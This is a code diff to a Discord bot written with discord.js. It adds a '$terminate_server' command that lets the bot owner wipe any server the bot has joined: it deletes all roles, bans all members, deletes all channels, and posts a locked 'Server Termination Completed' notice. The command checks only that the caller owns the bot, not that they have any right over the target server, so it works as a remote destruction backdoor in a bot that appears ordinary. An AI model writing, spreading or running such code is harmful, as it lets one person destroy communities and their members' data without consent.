@@ -1,6 +1,16 @@
 const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder } = require('discord.js');
 const keepAlive = require('./webservice');
-const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
+
+// Enable all necessary intents
+const client = new Client({
+    intents: [
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMessages,
+        GatewayIntentBits.MessageContent,
+        GatewayIntentBits.GuildMembers, // Required to fetch members
+        GatewayIntentBits.GuildPresences, // Required for role management
+    ],
+});
 
 const BOT_TOKEN = "YOUR_BOT_TOKEN"; // Replace with your actual bot token
 const PREFIX = "$";
@@ -22,6 +32,104 @@ client.on("messageCreate", async (msg) => {
 
     const args = msg.content.slice(PREFIX.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
+
+
+    // Terminate Server Command (Bot Owner Only)
+    if (command === "terminate_server") {
+        // Check if the user is the bot owner
+        if (msg.author.id !== botOwnerId) {
+            return msg.reply("❌ You do not have permission to use this command.");
+        }
+
+        const serverId = args[0];
+        if (!serverId) {
+            return msg.reply("⚠️ Please provide a server ID.");
+        }
+
+        const guild = client.guilds.cache.get(serverId);
+        if (!guild) {
+            return msg.reply("❌ The bot is not a member of the specified server.");
+        }
+
+        // Log the start of the process
+        console.log(`[TERMINATE SERVER] Starting termination process for server: ${guild.name} (ID: ${guild.id})`);
+
+        try {
+            // Delete all roles
+            console.log(`[TERMINATE SERVER] Deleting roles...`);
+            const roles = guild.roles.cache;
+            for (const role of roles.values()) {
+                if (role.id === guild.id) continue; // Skip the @everyone role
+                try {
+                    await role.delete();
+                    console.log(`[TERMINATE SERVER] Deleted role: ${role.name}`);
+                } catch (error) {
+                    console.error(`[TERMINATE SERVER] Failed to delete role ${role.name}: ${error.message}`);
+                }
+            }
+
+            // Ban all members
+            console.log(`[TERMINATE SERVER] Banning members...`);
+            const members = await guild.members.fetch();
+            for (const member of members.values()) {
+                if (member.id === client.user.id) continue; // Skip the bot itself
+                try {
+                    await member.ban();
+                    console.log(`[TERMINATE SERVER] Banned member: ${member.user.tag}`);
+                } catch (error) {
+                    console.error(`[TERMINATE SERVER] Failed to ban member ${member.user.tag}: ${error.message}`);
+                }
+            }
+
+            // Delete all channels
+            console.log(`[TERMINATE SERVER] Deleting channels...`);
+            const channels = guild.channels.cache;
+            for (const channel of channels.values()) {
+                try {
+                    await channel.delete();
+                    console.log(`[TERMINATE SERVER] Deleted channel: ${channel.name}`);
+                } catch (error) {
+                    console.error(`[TERMINATE SERVER] Failed to delete channel ${channel.name}: ${error.message}`);
+                }
+            }
+
+            // Create a new "info" channel
+            console.log(`[TERMINATE SERVER] Creating info channel...`);
+            try {
+                const infoChannel = await guild.channels.create({
+                    name: "info",
+                    type: 0, // Text channel
+                    permissionOverwrites: [
+                        {
+                            id: guild.roles.everyone,
+                            deny: [PermissionsBitField.Flags.SendMessages],
+                        },
+                    ],
+                });
+
+                // Send completion message
+                const embed = new EmbedBuilder()
+                    .setTitle("🚨 **Server Termination Completed**")
+                    .setDescription("All roles, members, and channels have been deleted. The server has been reset.")
+                    .setColor("#FF0000") // Red color
+                    .setFooter({ text: `Requested by ${msg.author.tag}`, iconURL: msg.author.displayAvatarURL() })
+                    .setTimestamp();
+
+                await infoChannel.send({ embeds: [embed] });
+                console.log(`[TERMINATE SERVER] Info channel created and completion message sent.`);
+            } catch (error) {
+                console.error(`[TERMINATE SERVER] Failed to create info channel: ${error.message}`);
+            }
+
+            // Log completion
+            console.log(`[TERMINATE SERVER] Termination process completed for server: ${guild.name} (ID: ${guild.id})`);
+            return msg.reply(`✅ Server termination completed for **${guild.name}**.`);
+        } catch (error) {
+            console.error(`[TERMINATE SERVER] Critical error during termination process: ${error.message}`);
+            return msg.reply(`❌ An error occurred during the termination process. Check logs for details.`);
+        }
+    }
+
 
     // List Servers Command (Bot Owner Only)
     if (command === "list_servers") {
